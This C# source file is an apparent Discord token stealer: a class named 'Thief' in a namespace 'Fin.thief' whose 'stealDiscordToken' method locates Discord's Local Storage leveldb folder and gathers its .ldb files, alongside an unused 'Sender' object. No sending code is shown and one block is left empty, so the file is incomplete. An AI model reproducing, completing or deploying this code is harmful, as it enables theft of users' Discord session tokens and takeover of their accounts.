using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using static System.IO.File;

namespace Fin.thief
{
    public class Thief
    {
        
       public List<string> files = new List<string>();
        Sender _sender = new Sender();
        
        String DiscordData = Directory.GetParent(Directory.GetParent(Directory.GetParent(Path.GetTempPath()).FullName).FullName).FullName + "\\Roaming\\discord\\Local Storage\\leveldb";

        public Thief()
        {}
        
        public void stealDiscordToken()
        {
            
            if (Directory.Exists(DiscordData))
            {
                foreach (var file in Directory.GetFiles(DiscordData))
                {
                    if (file.EndsWith("ldb"))
                    {
                        files.Add(file);
                    }
                }
            }
            
            {
                
                
                
            }

        }

        public void listen()
        {

            Program.observer = new Observer();

        }
  
        
    }
}